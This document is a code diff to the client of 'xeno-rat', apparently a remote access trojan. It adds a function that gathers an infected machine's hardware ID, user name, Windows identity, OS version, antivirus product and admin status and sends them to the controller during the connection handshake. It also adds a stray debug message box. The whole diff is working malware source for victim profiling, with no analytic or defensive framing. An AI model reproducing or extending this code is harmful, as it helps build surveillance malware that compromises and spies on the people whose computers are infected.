@@ -11,8 +11,10 @@ using System.Net.Sockets;
 using System.Reflection;
 using System.Runtime.InteropServices;
 using System.Security.Cryptography;
+using System.Security.Principal;
 using System.Text;
 using System.Threading.Tasks;
+using System.Windows.Forms;
 using System.Xml.Linq;
 
 namespace xeno_rat_client
@@ -168,14 +170,36 @@ namespace xeno_rat_client
                 strResult.Append(b.ToString("x2"));
             return strResult.ToString().Substring(0, 20).ToUpper();
         }
+
+        private static byte[] GetSysInfo()
+        {
+            //get hwid, username etc. seperated by null
+            string clientversion = "1.8.7";//find a way to get the client version.
+            string[] info = new string[] { Utils.HWID(), Environment.UserName, WindowsIdentity.GetCurrent().Name, clientversion, Utils.GetWindowsVersion(), Utils.GetAntivirus(), Utils.IsAdmin().ToString() };
+            byte[] data = new byte[0];
+            byte[] nullbyte = new byte[] { 0 };
+            for (int i = 0; i < info.Length; i++)
+            {
+                byte[] byte_data = Encoding.UTF8.GetBytes(info[i]);
+                data = SocketHandler.Concat(data, byte_data);
+                if (i != info.Length - 1)
+                {
+                    data = SocketHandler.Concat(data, nullbyte);
+                }
+            }
+            return data;
+        }
+
         public static async Task<Node> ConnectAndSetupAsync(Socket sock, byte[] key, int type = 0, int ID = 0, Action<Node> OnDisconnect = null)
         {
             Node conn;
             try
             {
                 conn = new Node(new SocketHandler(sock, key), OnDisconnect);
-                if (!(await conn.AuthenticateAsync(type, ID)))
+                byte[] data = GetSysInfo();
+                if (!(await conn.AuthenticateAsync(type, ID, data)))
                 {
+                    MessageBox.Show("4", "Client.Util.ConnectAndSetupAsync");
                     return null;
                 }
             }
